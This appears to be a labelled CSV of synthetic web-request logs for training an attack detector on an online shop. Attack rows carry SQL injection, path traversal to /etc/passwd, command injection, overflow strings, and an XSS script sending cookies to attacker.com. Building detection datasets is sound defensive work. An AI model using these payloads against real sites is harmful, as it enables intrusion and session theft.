timestamp,ip,method,path,payload,label
07:25:09.7,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:25:11.5,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:25:12.8,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:25:14.8,192.168.1.169,GET,/product/2,,0
07:25:17.5,192.168.1.56,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:25:19.3,10.0.0.82,GET,/auth/logout,,0
07:25:21.5,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:25:23.3,192.168.1.50,GET,/auth/register,,0
07:25:25.5,203.162.4.190,GET,/../../../../etc/passwd,,1
07:25:27.3,192.168.1.46,GET,/order/myorders,,0
07:25:29.2,203.162.4.190,GET,/product/1' AND 1=1,,1
07:25:30.9,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:25:33.0,192.168.1.12,GET,/auth/logout,,0
07:25:35.6,203.162.4.190,POST,/auth/register,"{'csrf_token': 'ImLuzYrJnlU8yhbgxWHF6A7TBhSkYqa636B5VHoIak'.0Kwmqrs9.leEjRmtQwUzFBsRkNQ6Y1Iih6hL-, 'username': 'newuser87', 'email': 'a48@b.com', 'password': '%6RzN!f31b6s', 'submit': 'Register'}",0
07:25:37.4,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
07:25:38.8,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:25:41.5,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:25:43.7,203.162.4.191,POST,/auth/register,"{'csrf_token': 'Img0Wn5tjlXRL5oF1Lo3yGTSbjQpddv7KxSzIAGsA1'.g5z3d0Nr.6_VMvROe0AgRAAWxF-e0PSBsKP15, 'username': 'newuser38', 'email': 'a94@b.com', 'password': 'nPDSujBzR3*h', 'submit': 'Register'}",0
07:25:45.6,10.0.0.28,POST,/auth/login,"{'csrf_token': 'ImMwkRy3irCb2usI5d7cod2lYlk1cVC9g0Qi9PhY97'.6E3OMlGd.kMNN2JZ1KgpDBa8laUm557UAY4L9, 'username': 'user87', 'password': 'yslGRuh5HXTv', 'submit': 'Log in'}",0
07:25:47.5,192.168.1.141,GET,/order/myorders,,0
07:25:49.6,192.168.1.104,GET,/category/Iphone,,0
07:25:51.1,192.168.1.197,GET,/order/cart,,0
07:25:53.7,192.168.1.167,GET,/auth/logout,,0
07:25:54.8,203.162.4.190,GET,/order/cart,,0
07:25:57.6,203.162.4.191,GET,/product/1' AND 1=1,,1
07:25:59.4,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
07:26:01.4,192.168.1.169,POST,/auth/login,"{'csrf_token': 'ImQV2JbOXoHAOuzeq61lziAnLnhyPgAtz5BFvPYWxe'.nDbe2qYf.oLOFDUe1pPHsByl97LyEAG4_chAO, 'username': 'user81', 'password': 'P@POx(Gz#X^3', 'submit': 'Log in'}",0
07:26:03.7,203.162.4.191,POST,/auth/login,"{'csrf_token': 'ImoEdwpqs9D1hHTVvNXlJqJjGMO5GQUEf90aBo5JXc'.QwIUccPF.lVawRtqDbj4yn9aJcunitkmPsNMn, 'username': 'user76', 'password': 'h9ZUDWZRwlH9', 'submit': 'Log in'}",0
07:26:05.0,10.0.0.82,GET,/auth/logout,,0
07:26:07.1,192.168.1.144,GET,/auth/register,,0
07:26:09.2,192.168.1.50,GET,/order/myorders,,0
07:26:11.2,192.168.1.165,POST,/search,{'query': 'iphone 15 pro max'},0
07:26:13.5,203.162.4.191,GET,/auth/login,,0
07:26:15.6,192.168.1.22,GET,/product/1,,0
07:26:17.5,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:26:19.2,192.168.1.50,GET,/product/1,,0
07:26:21.5,192.168.1.56,GET,/product/2,,0
07:26:22.7,10.0.0.82,GET,/category/Iphone,,0
07:26:24.8,10.0.0.176,GET,/auth/register,,0
07:26:27.5,192.168.1.151,POST,/auth/register,"{'csrf_token': 'ImvkxTVdyLuKbiJEG6pNOKCxYMQWkrFPj0J0M7ayP7'.vEuKpPDf.tCMF3rNGCqS1PujmR8KZfHJrc--0, 'username': 'newuser93', 'email': 'a87@b.com', 'password': 'x03)!u%Mcnx!', 'submit': 'Register'}",0
07:26:29.1,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:26:30.7,192.168.1.175,POST,/search,{'query': 'iphone 15 pro max'},0
07:26:32.9,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
07:26:35.3,10.0.0.195,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:26:37.2,192.168.1.46,GET,/auth/login,,0
07:26:39.0,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:26:41.5,203.162.4.191,POST,/auth/register,"{'csrf_token': 'ImP4bjmeGi7c5azmeaCndqdF9hBjdvdf7s5QAWme0Z'.35FDqh2I.0pI3om8D0wAvZCwXlYnPEJ38UNLW, 'username': 'newuser11', 'email': 'a19@b.com', 'password': '^*msvabDWxsA', 'submit': 'Register'}",0
07:26:43.7,203.162.4.190,GET,/../../../../etc/passwd,,1
07:26:45.5,203.162.4.190,GET,/product/1,,0
07:26:46.8,10.0.0.195,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:26:49.0,192.168.1.167,GET,/,,0
07:26:50.8,10.0.0.146,POST,/auth/login,"{'csrf_token': 'ImJPcij9dDcJgNxqNBzblJhaK0CofuXvGPjEwPGO6P'.RelkykNB.xdwG3WOQsS3ss5XkFr58OCxu3PpG, 'username': 'user98', 'password': 'TWxKEXDT9*OS', 'submit': 'Log in'}",0
07:26:53.4,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:26:55.0,192.168.1.175,GET,/auth/register,,0
07:26:56.9,192.168.1.197,POST,/auth/register,"{'csrf_token': 'ImB4Yi6SnTXGPWwvIvPb6lWxp9r1z1xqrodLNND88t'.JAbbYD4I.GuXWqbuPHr5sA5R4v4ivkxawwP4k, 'username': 'newuser45', 'email': 'a80@b.com', 'password': 'tPWBfnV@1R50', 'submit': 'Register'}",0
07:26:59.3,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:27:01.6,203.162.4.191,GET,/../../../../etc/passwd,,1
07:27:03.2,10.0.0.106,GET,/product/1,,0
07:27:04.9,192.168.1.185,GET,/product/1,,0
07:27:07.3,10.0.0.79,POST,/auth/register,"{'csrf_token': 'ImQmf84g0A3ayX6H0iHzRr28I6abhR6u0fMVDuTYrT'.H8NgXFzZ.-V9GXYBnW-ih5KSF7sWQUcsAXwAx, 'username': 'newuser99', 'email': 'a98@b.com', 'password': 'OZ0WWMHXBZkA', 'submit': 'Register'}",0
07:27:09.7,192.168.1.169,GET,/product/1,,0
07:27:10.9,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
07:27:13.0,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:27:15.2,103.75.118.228,GET,/../../../../etc/passwd,,1
07:27:17.4,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:27:19.4,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:27:21.0,10.0.0.79,GET,/product/2,,0
07:27:23.4,192.168.1.162,GET,/auth/register,,0
07:27:25.4,192.168.1.175,POST,/auth/register,"{'csrf_token': 'ImxSXn3GbaZptlJHO1gbTAOWAYfxnfWBQ5puTE4Lh0'.yqx5l7Ut.StuWYEM241_ZPKam1LnzJU6-OQsF, 'username': 'newuser43', 'email': 'a16@b.com', 'password': 'ID4pybS5s!gQ', 'submit': 'Register'}",0
07:27:26.9,203.162.4.191,GET,/../../../../etc/passwd,,1
07:27:29.6,10.0.0.15,POST,/auth/register,"{'csrf_token': 'ImNDi65eSv0ezmesEfkKCHjv9yxLy5IYwD7IvShe1Q'.gQ95ZiAo.2VtQkgf-4noMIDqkxMMntpGOZuP-, 'username': 'newuser5', 'email': 'a91@b.com', 'password': 'e)xzqrs@dkG@', 'submit': 'Register'}",0
07:27:30.8,192.168.1.162,GET,/,,0
07:27:33.7,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:27:35.2,127.0.0.1,GET,/auth/login,,0
07:27:37.1,192.168.1.18,POST,/auth/login,"{'csrf_token': 'ImoXEE1uWIuc5SDjRU4T4MxwHsFfnRus9i5xnvDSsQ'.cOzGsiLm.UT4cLquDJqwc_oZQ5CUIomgYfZAE, 'username': 'user51', 'password': 'L2$4pYipRdkF', 'submit': 'Log in'}",0
07:27:39.0,10.0.0.79,POST,/auth/register,"{'csrf_token': 'Imi4GSoi1AlCjraUdZt8lSLE9oBQrqP1283ujN0c10'.oMXg5OpX.F5T2r7l8NYFI40Yz_qtfOanhIZNi, 'username': 'newuser88', 'email': 'a37@b.com', 'password': 'rX!dX)mj*scU', 'submit': 'Register'}",0
07:27:40.8,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:27:43.6,192.168.1.50,GET,/category/Iphone,,0
07:27:45.3,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:27:47.0,192.168.1.197,GET,/product/1,,0
07:27:49.7,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
07:27:51.3,192.168.1.22,GET,/order/myorders,,0
07:27:53.4,10.0.0.28,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:27:55.7,203.162.4.191,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:27:57.6,192.168.1.197,GET,/product/2,,0
07:27:59.5,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
07:28:01.2,192.168.1.185,GET,/auth/logout,,0
07:28:03.0,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:28:05.3,203.162.4.191,GET,/product/1' AND 1=1,,1
07:28:06.9,192.168.1.22,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:28:09.7,192.168.1.169,POST,/search,{'query': 'iphone 15 pro max'},0
07:28:11.0,192.168.1.104,GET,/auth/register,,0
07:28:13.7,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
07:28:15.4,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:28:17.7,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
07:28:19.6,203.162.4.190,GET,/../../../../etc/passwd,,1
07:28:21.1,103.75.118.228,GET,/../../../../etc/passwd,,1
07:28:23.0,10.0.0.15,POST,/search,{'query': 'iphone 15 pro max'},0
07:28:25.6,192.168.1.104,GET,/product/2,,0
07:28:27.6,10.0.0.146,GET,/order/myorders,,0
07:28:29.7,203.162.4.191,GET,/product/1,,0
07:28:31.2,192.168.1.46,POST,/auth/login,"{'csrf_token': 'ImArTTXbN8aRUTiZ4x4LKU39cYLHzDgnQbaD5YRvec'.wTEBK0Ao.zjj0_h0TMnlswh7mL8zB5AB4N8Vp, 'username': 'user57', 'password': 'W!qi&36P&far', 'submit': 'Log in'}",0
07:28:33.0,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:28:34.8,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:28:37.4,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:28:38.8,10.0.0.15,GET,/order/cart,,0
07:28:41.3,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:28:43.5,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:28:45.2,103.75.118.228,GET,/product/1' AND 1=1,,1
07:28:47.0,10.0.0.67,POST,/auth/login,"{'csrf_token': 'Im9pC1yuSlMuVzIXw0Wapj5t58FqloxWRmfAR1Gc6L'.7fsMJZXP.4JTMkasVZUphnnYXwO_EP4AwlB9O, 'username': 'user95', 'password': '!nBpU4652Lqf', 'submit': 'Log in'}",0
07:28:48.8,192.168.1.12,POST,/auth/login,"{'csrf_token': 'Im5xZmkossNpweYpOoWGp0SJoAOs4OjcM0BPwXOH9h'.Gsj9qPmm.i69q2MiIK86qhFRzC6YK11gtJL8S, 'username': 'user75', 'password': '^PqPsYB^To#q', 'submit': 'Log in'}",0
07:28:51.7,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:28:53.6,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:28:55.5,192.168.1.185,GET,/auth/logout,,0
07:28:57.4,10.0.0.82,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:28:58.9,192.168.1.141,POST,/search,{'query': 'iphone 15 pro max'},0
07:29:01.4,103.75.118.228,GET,/../../../../etc/passwd,,1
07:29:03.4,203.162.4.191,GET,/../../../../etc/passwd,,1
07:29:05.7,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:29:07.1,203.162.4.191,GET,/product/1' AND 1=1,,1
07:29:09.1,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:29:11.1,10.0.0.176,GET,/auth/register,,0
07:29:13.0,10.0.0.195,GET,/product/1,,0
07:29:15.5,192.168.1.55,POST,/search,{'query': 'iphone 15 pro max'},0
07:29:17.7,127.0.0.1,POST,/auth/register,"{'csrf_token': 'ImeNp7vYBAt18XcTUsJ9CRGvxhYeZOZ9bBOoVR0cCT'.2MZsu8e8.iwX4JXAPNpb_LJ4FMm30-5y9TFXM, 'username': 'newuser48', 'email': 'a50@b.com', 'password': 'ikvQccb9(Mww', 'submit': 'Register'}",0
07:29:19.3,192.168.1.12,GET,/order/cart,,0
07:29:20.9,192.168.1.162,POST,/auth/register,"{'csrf_token': 'ImcBhEV1VVpJmTss5eWzkYdpZqagNuWQbUGEgq7srj'.ZuI9cJR2.-E2bXD-RK5nn4y2_46tsYGSdzbmt, 'username': 'newuser99', 'email': 'a37@b.com', 'password': '!vFP8HH%IXe&', 'submit': 'Register'}",0
07:29:23.5,10.0.0.28,POST,/search,{'query': 'iphone 15 pro max'},0
07:29:25.4,10.0.0.28,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:29:27.1,192.168.1.144,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:29:29.0,192.168.1.55,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:29:30.9,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
07:29:32.9,103.75.118.228,GET,/../../../../etc/passwd,,1
07:29:35.6,192.168.1.197,GET,/order/myorders,,0
07:29:37.5,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:29:39.6,10.0.0.67,POST,/auth/register,"{'csrf_token': 'Imy2A6yQZjdxs34yecp7AZFXiI2uQgVYutmQ3nsOUn'.9KBigIfx._LxZZcThTPsXVTPElTGBJWkSgEhl, 'username': 'newuser46', 'email': 'a62@b.com', 'password': 'bG6RUW4Hdjq&', 'submit': 'Register'}",0
07:29:41.5,203.162.4.190,GET,/product/1' AND 1=1,,1
07:29:43.4,192.168.1.175,GET,/auth/logout,,0
07:29:45.3,203.162.4.190,POST,/auth/register,"{'csrf_token': 'Im6YGquFJrdnnVNB4QjPeWu4Z7EovE8KRrMbzOdjxa'.ED4JohLx.uOudWm_yl8VrlymDXsRT0rq6cQaf, 'username': 'newuser80', 'email': 'a87@b.com', 'password': 'xhX&ISsHFFD^', 'submit': 'Register'}",0
07:29:47.3,192.168.1.12,POST,/auth/login,"{'csrf_token': 'ImSVC0H79Airu9Sq8JKuRxMvqCeerYq0FeXvePAXBy'.4VaoZLHQ.cFFXxKeCFxGZy-O2tvy3yWsjkLvw, 'username': 'user18', 'password': 'NYMXh*&FipO1', 'submit': 'Log in'}",0
07:29:49.4,10.0.0.79,POST,/auth/register,"{'csrf_token': 'ImBtQ1dyDEJU8aJEdpHIFg4yknbKMOzDlP5npcdKcw'.FaSgkOPs.46gf0rtaIVE4ZFWZ0O3PZiWGQmcF, 'username': 'newuser27', 'email': 'a55@b.com', 'password': '#N$s$)aaj)XO', 'submit': 'Register'}",0
07:29:50.9,203.162.4.190,GET,/product/1' AND 1=1,,1
07:29:53.6,192.168.1.22,GET,/auth/login,,0
07:29:55.5,192.168.1.169,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:29:57.2,192.168.1.185,GET,/auth/register,,0
07:29:59.2,192.168.1.175,POST,/auth/register,"{'csrf_token': 'Imr3uJEPufmEytcRxq09fzmnz0ECBXZvKKeB0rGRR5'.J8pBHd9D.IPf97ZMCHPdH9XWymoRJ6mezCdN1, 'username': 'newuser100', 'email': 'a22@b.com', 'password': '$(pGJi%df49m', 'submit': 'Register'}",0
07:30:01.4,192.168.1.104,GET,/order/myorders,,0
07:30:03.4,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
07:30:04.9,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
07:30:07.1,192.168.1.162,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:30:09.6,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
07:30:10.8,192.168.1.185,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:30:13.0,10.0.0.79,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
07:30:14.8,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
07:30:17.4,192.168.1.28,GET,/auth/login,,0
07:30:19.6,10.0.0.15,POST,/auth/login,"{'csrf_token': 'ImQ0hk49v1ljkzIM9IGzlbcAFX1KZbdM6m7FNg6223'.FpTioKYM.tmtcVCSkuoAy3YAzGu0z1epPogxn, 'username': 'user72', 'password': 'iG$UAh%WWSqe', 'submit': 'Log in'}",0
07:30:21.0,192.168.1.197,GET,/order/myorders,,0
07:30:23.1,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
07:30:25.4,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
07:30:27.3,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:30:28.9,192.168.1.46,POST,/search,{'query': 'iphone 15 pro max'},0
07:30:31.7,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:30:33.3,192.168.1.12,POST,/search,{'query': 'iphone 15 pro max'},0
07:30:35.2,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:30:36.9,10.0.0.15,GET,/auth/login,,0
07:30:39.2,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
07:30:41.5,192.168.1.28,POST,/auth/register,"{'csrf_token': 'ImhxkkszQltB298qW2pKwaR54WEXfZkpt4klWmNT6J'.7o1BUmEt.LtY-eXPJEhNiPqCSJLN9wEChi7V8, 'username': 'newuser50', 'email': 'a48@b.com', 'password': 'per3Jea3h@6o', 'submit': 'Register'}",0
07:30:43.3,192.168.1.167,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
07:30:44.8,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
07:30:47.1,192.168.1.141,GET,/auth/logout,,0
07:30:49.2,10.0.0.82,GET,/order/cart,,0
07:30:51.7,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
07:30:53.0,192.168.1.167,GET,/order/myorders,,0
07:30:55.7,192.168.1.141,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
